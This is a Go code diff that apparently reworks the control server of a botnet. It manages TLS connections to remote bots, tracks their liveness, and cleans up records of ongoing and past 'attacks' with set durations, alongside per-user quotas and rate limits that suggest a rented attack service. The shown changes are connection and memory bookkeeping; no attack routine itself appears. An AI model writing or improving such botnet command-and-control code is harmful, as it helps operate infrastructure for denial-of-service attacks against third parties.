@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/subtle"
 	"crypto/tls"
+	"net"
 	"runtime"
 	"sync"
 	"time"
@@ -32,28 +33,6 @@ func NewBoundedMap(maxSize int) *BoundedMap {
 	return &BoundedMap{
 		data:    make(map[string]interface{}),
 		maxSize: maxSize,
-	}
-}
-
-// estimateSize roughly estimates the size of a value in bytes
-func estimateSize(value interface{}) int64 {
-	// This is a simplified implementation - you might want to make it more accurate
-	switch v := value.(type) {
-	case string:
-		return int64(len(v))
-	case []byte:
-		return int64(len(v))
-	case int:
-		return 8
-	case int64:
-		return 8
-	case float64:
-		return 8
-	case bool:
-		return 1
-	default:
-		// For complex types, return a conservative estimate
-		return 128
 	}
 }
 
@@ -235,7 +214,6 @@ func SecureCompareBytes(a, b []byte) bool {
 	return subtle.ConstantTimeCompare(a, b) == 1
 }
 
-// Enhanced MemoryManager with better tracking and cleanup
 type MemoryManager struct {
 	allocated     int64
 	maxMemory     int64
@@ -269,7 +247,6 @@ func (mm *MemoryManager) Allocate(size int64) (uintptr, bool) {
 		return 0, false // Exceeds max memory
 	}
 
-	// Simulate allocation (in real usage, this would track actual memory allocations)
 	ptr := uintptr(mm.allocated) // Simplified pointer simulation
 	mm.allocations[ptr] = size
 	mm.allocated += size
@@ -323,7 +300,6 @@ func (mm *MemoryManager) Close() {
 	}
 }
 
-// MutexManager for managing and monitoring mutex usage
 type MutexManager struct {
 	mutexes       map[string]*sync.RWMutex
 	mutexUsage    map[string]time.Time
@@ -357,7 +333,6 @@ func (mm *MutexManager) GetMutex(key string) *sync.RWMutex {
 	}
 
 	if len(mm.mutexes) >= mm.maxMutexes {
-		// Clean up least recently used mutex
 		mm.cleanupLRU()
 	}
 
@@ -433,61 +408,24 @@ var (
 )
 
 func init() {
-	for limitType := range defaultRateLimits {
-		boundedRateLimitEntries[limitType] = NewBoundedMap(MaxRateLimitEntries)
+	for i := 0; i < int(RateLimitConnection)+1; i++ {
+		boundedRateLimitEntries[RateLimitType(i)] = NewBoundedMap(MaxRateLimitEntries)
 	}
-
 	go cleanupBoundedCollections()
 }
 
-func cleanupBoundedCollections() {
-	ticker := time.NewTicker(5 * time.Minute)
-	defer ticker.Stop()
-
-	for range ticker.C {
-		boundedSessions.Cleanup(func(key string, value interface{}) bool {
-			session := value.(*Session)
-			return time.Since(session.LastActive) > sessionTimeout
-		})
-
-		boundedAuthAttempts.Cleanup(func(key string, value interface{}) bool {
-			attempt := value.(*AuthAttempt)
-			attempt.Lock.Lock()
-			defer attempt.Lock.Unlock()
-			return time.Since(attempt.LastAttempt) > 24*time.Hour
-		})
-
-		for _, entries := range boundedRateLimitEntries {
-			entries.Cleanup(func(key string, value interface{}) bool {
-				entry := value.(*RateLimitEntry)
-				entry.Lock.Lock()
-				defer entry.Lock.Unlock()
-				return time.Since(entry.LastRequest) > 24*time.Hour
-			})
-		}
-
-		boundedAttackHistory.Cleanup(func(value interface{}) bool {
-			attack := value.(Attack)
-			return time.Since(attack.start) > 24*time.Hour
-		})
-	}
-}
-
 type ThreadSafeBotManager struct {
-	bots      map[string]*tls.Conn
-	status    map[string]string
-	lastSeen  map[string]time.Time
-	pingTimes map[string]time.Duration
+	bots map[string]*tls.Conn
+	// map from connection remote address string to botID to avoid re-authing and duplicate adds
+	connToBot map[string]string
 	mutex     *sync.RWMutex
 }
 
 func NewThreadSafeBotManager() *ThreadSafeBotManager {
 	return &ThreadSafeBotManager{
 		bots:      make(map[string]*tls.Conn),
-		status:    make(map[string]string),
-		lastSeen:  make(map[string]time.Time),
-		pingTimes: make(map[string]time.Duration),
-		mutex:     globalMutexManager.GetMutex("bot_manager"),
+		connToBot: make(map[string]string),
+		mutex:     &sync.RWMutex{},
 	}
 }
 
@@ -495,123 +433,173 @@ func (m *ThreadSafeBotManager) AddBot(botID string, conn *tls.Conn) {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
+	// If a previous connection exists for this botID, close it and replace
+	if oldConn, ok := m.bots[botID]; ok {
+		if oldConn != nil {
+			oldConn.Close()
+		}
+		// remove any reverse mapping to the old connection
+		for k, v := range m.connToBot {
+			if v == botID {
+				delete(m.connToBot, k)
+			}
+		}
+	}
+
 	m.bots[botID] = conn
-	m.status[botID] = "ONLINE"
-	m.lastSeen[botID] = time.Now()
-	m.pingTimes[botID] = 0
+	m.connToBot[conn.RemoteAddr().String()] = botID
+	heartbeatManager.UpdateBot(botID, time.Now(), 0)
 }
 
 func (m *ThreadSafeBotManager) RemoveBot(botID string) {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
-	delete(m.bots, botID)
-	delete(m.status, botID)
-	delete(m.lastSeen, botID)
-	delete(m.pingTimes, botID)
+	if conn, ok := m.bots[botID]; ok {
+		delete(m.bots, botID)
+		// remove any reverse mapping entries
+		for k, v := range m.connToBot {
+			if v == botID {
+				delete(m.connToBot, k)
+				break
+			}
+		}
+		if conn != nil {
+			conn.Close()
+		}
+		heartbeatManager.RemoveBot(botID)
+	}
+}
+
+// GetBotIDByConn returns the botID associated with a connection (by remote addr), or empty if none
+func (m *ThreadSafeBotManager) GetBotIDByConn(conn net.Conn) string {
+	m.mutex.RLock()
+	defer m.mutex.RUnlock()
+	return m.connToBot[conn.RemoteAddr().String()]
 }
 
 func (m *ThreadSafeBotManager) GetBot(botID string) (*tls.Conn, bool) {
 	m.mutex.RLock()
 	defer m.mutex.RUnlock()
-
-	conn, exists := m.bots[botID]
-	return conn, exists
-}
-
-func (m *ThreadSafeBotManager) UpdateStatus(botID, status string) {
-	m.mutex.Lock()
-	defer m.mutex.Unlock()
-
-	m.status[botID] = status
-	m.lastSeen[botID] = time.Now()
-}
-
-func (m *ThreadSafeBotManager) UpdatePing(botID string, ping time.Duration) {
-	m.mutex.Lock()
-	defer m.mutex.Unlock()
-
-	m.pingTimes[botID] = ping
-	m.lastSeen[botID] = time.Now()
-}
-
-func (m *ThreadSafeBotManager) GetStatus(botID string) string {
-	m.mutex.RLock()
-	defer m.mutex.RUnlock()
-
-	return m.status[botID]
-}
-
-func (m *ThreadSafeBotManager) GetPing(botID string) time.Duration {
-	m.mutex.RLock()
-	defer m.mutex.RUnlock()
-
-	return m.pingTimes[botID]
-}
-
-func (m *ThreadSafeBotManager) GetLastSeen(botID string) time.Time {
-	m.mutex.RLock()
-	defer m.mutex.RUnlock()
-
-	return m.lastSeen[botID]
+	conn, ok := m.bots[botID]
+	return conn, ok
 }
 
 func (m *ThreadSafeBotManager) GetAllBots() map[string]*tls.Conn {
 	m.mutex.RLock()
 	defer m.mutex.RUnlock()
-
-	botsCopy := make(map[string]*tls.Conn)
+	// Return a copy to avoid race conditions with the caller
+	botCopy := make(map[string]*tls.Conn)
 	for id, conn := range m.bots {
-		botsCopy[id] = conn
+		botCopy[id] = conn
 	}
-	return botsCopy
-}
-
-func (m *ThreadSafeBotManager) GetAllStatuses() map[string]string {
-	m.mutex.RLock()
-	defer m.mutex.RUnlock()
-
-	statusCopy := make(map[string]string)
-	for id, status := range m.status {
-		statusCopy[id] = status
-	}
-	return statusCopy
+	return botCopy
 }
 
 func (m *ThreadSafeBotManager) Count() int {
 	m.mutex.RLock()
 	defer m.mutex.RUnlock()
-
 	return len(m.bots)
 }
 
-func (m *ThreadSafeBotManager) CleanupInactive(timeout time.Duration) {
+// Cleanup removes disconnected bots
+func (m *ThreadSafeBotManager) Cleanup() {
 	m.mutex.Lock()
 	defer m.mutex.Unlock()
 
-	now := time.Now()
-	for botID, lastSeen := range m.lastSeen {
-		if now.Sub(lastSeen) > timeout {
+	for botID, conn := range m.bots {
+		if conn == nil {
 			delete(m.bots, botID)
-			delete(m.status, botID)
-			delete(m.lastSeen, botID)
-			delete(m.pingTimes, botID)
+			heartbeatManager.RemoveBot(botID)
+			for k, v := range m.connToBot {
+				if v == botID {
+					delete(m.connToBot, k)
+					break
+				}
+			}
+			continue
 		}
+		// Check if connection is still alive by sending a byte
+		conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
+		if _, err := conn.Write([]byte{}); err != nil {
+			delete(m.bots, botID)
+			heartbeatManager.RemoveBot(botID)
+			for k, v := range m.connToBot {
+				if v == botID {
+					delete(m.connToBot, k)
+					break
+				}
+			}
+			conn.Close()
+		}
+		conn.SetWriteDeadline(time.Time{})
 	}
 }
 
 var botManager = NewThreadSafeBotManager()
 
-func GetBotManager() *ThreadSafeBotManager {
-	return botManager
-}
+func cleanupBoundedCollections() {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
 
-// GetGlobalMemoryManager returns the global memory manager instance
-func GetGlobalMemoryManager() *MemoryManager {
-	return globalMemoryManager
-}
+	for range ticker.C {
+		// Cleanup BoundedMaps
+		boundedBotConns.Cleanup(func(key string, value interface{}) bool {
+			// Example: remove if older than 24 hours
+			if entry, ok := value.(time.Time); ok {
+				return time.Since(entry) > 24*time.Hour
+			}
+			return false
+		})
+		boundedSessions.Cleanup(func(key string, value interface{}) bool {
+			if s, ok := value.(*Session); ok {
+				return time.Now().After(s.ExpiresAt)
+			}
+			return false
+		})
+		boundedAuthAttempts.Cleanup(func(key string, value interface{}) bool {
+			if a, ok := value.(*AuthAttempt); ok {
+				return time.Since(a.LastAttempt) > 1*time.Hour
+			}
+			return false
+		})
+		boundedUserQuotas.Cleanup(func(key string, value interface{}) bool {
+			if q, ok := value.(*UserQuota); ok {
+				return time.Since(q.LastReset) > 24*time.Hour
+			}
+			return false
+		})
+		for _, bm := range boundedRateLimitEntries {
+			bm.Cleanup(func(key string, value interface{}) bool {
+				if e, ok := value.(*RateLimitEntry); ok {
+					return time.Since(e.LastRequest) > 24*time.Hour
+				}
+				return false
+			})
+		}
+		boundedOngoingAttacks.Cleanup(func(key string, value interface{}) bool {
+			if a, ok := value.(Attack); ok {
+				return time.Since(a.start) > a.duration
+			}
+			return false
+		})
+		boundedOngoingAPIAttacks.Cleanup(func(key string, value interface{}) bool {
+			if a, ok := value.(Attack); ok {
+				return time.Since(a.start) > a.duration
+			}
+			return false
+		})
 
-// GetGlobalMutexManager returns the global mutex manager instance
-func GetGlobalMutexManager() *MutexManager {
-	return globalMutexManager
+		// Cleanup BoundedSlice
+		boundedAttackHistory.Cleanup(func(value interface{}) bool {
+			// Example: remove history older than 7 days
+			if a, ok := value.(Attack); ok {
+				return time.Since(a.start) > 7*24*time.Hour
+			}
+			return false
+		})
+
+		// Force GC to reclaim memory
+		runtime.GC()
+	}
 }
